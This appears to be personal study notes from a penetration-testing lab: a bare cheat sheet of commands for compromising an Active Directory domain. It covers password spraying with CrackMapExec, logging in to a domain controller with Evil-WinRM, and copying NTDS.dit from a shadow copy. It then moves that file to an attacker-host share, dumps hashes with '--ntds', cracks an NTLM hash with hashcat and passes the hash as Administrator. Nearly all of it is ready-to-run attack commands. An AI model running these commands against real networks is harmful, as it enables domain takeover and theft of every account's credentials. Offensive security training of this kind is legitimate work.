![[Pasted image 20240723145903.png]]
## Dictionary Attacks against AD accounts using CrackMapExec
###### [Username Anarchy](https://github.com/urbanadventurer/username-anarchy)
```shell
./username-anarchy -i /home/ltnbob/names.txt 
```
#### Launching the Attack with CrackMapExec
```shell
crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```
## Capturing NTDS.dit
#### Connecting to a DC with Evil-WinRM
```shell
evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
```
#### Checking Local Group Membership
```shell
net localgroup
```
#### Checking User Account Privileges including Domain
```shell
net user bwilliamson
```
#### Creating Shadow Copy of C:
```shell
vssadmin CREATE SHADOW /For=C:
```
#### Copying NTDS.dit from the VSS
```shell
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```
#### Transferring NTDS.dit to Attack Host
```shell
cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 
```
#### A Faster Method: Using cme to Capture NTDS.dit
```shell
crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
```
#### Cracking a Single Hash with Hashcat
```shell
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```
#### Pass-the-Hash with Evil-WinRM Example
```shell
evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```
